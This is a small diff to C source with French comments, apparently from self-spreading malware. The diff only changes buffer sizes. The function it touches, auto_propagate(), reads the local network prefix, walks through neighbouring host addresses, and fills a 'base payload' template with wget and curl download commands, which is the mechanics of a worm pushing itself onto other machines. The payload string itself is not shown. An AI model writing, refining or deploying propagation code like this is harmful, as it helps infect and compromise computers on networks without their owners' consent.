@@ -179,8 +179,8 @@ void auto_propagate() {
     if (f && fgets(localnet, sizeof(localnet), f)) {
         localnet[strcspn(localnet, "\n")] = 0;
         char ip[64];
-        char cmd[CMD_MAX_SIZE];
-        char base_payload[PAYLOAD_MAX_SIZE];
+        char cmd[CMD_SIZE];
+        char base_payload[CMD_SIZE];
         
         // Préparer le payload de base
         snprintf(base_payload, sizeof(base_payload), 
@@ -191,8 +191,8 @@ void auto_propagate() {
             snprintf(ip, sizeof(ip), "%s.%d", localnet, i);
             
             // Préparer les commandes
-            char wget_cmd[PAYLOAD_MAX_SIZE];
-            char curl_cmd[PAYLOAD_MAX_SIZE];
+            char wget_cmd[CMD_SIZE];
+            char curl_cmd[CMD_SIZE];
             
             snprintf(wget_cmd, sizeof(wget_cmd), base_payload, "wget", " -O ");
             snprintf(curl_cmd, sizeof(curl_cmd), base_payload, "curl -O", ";");
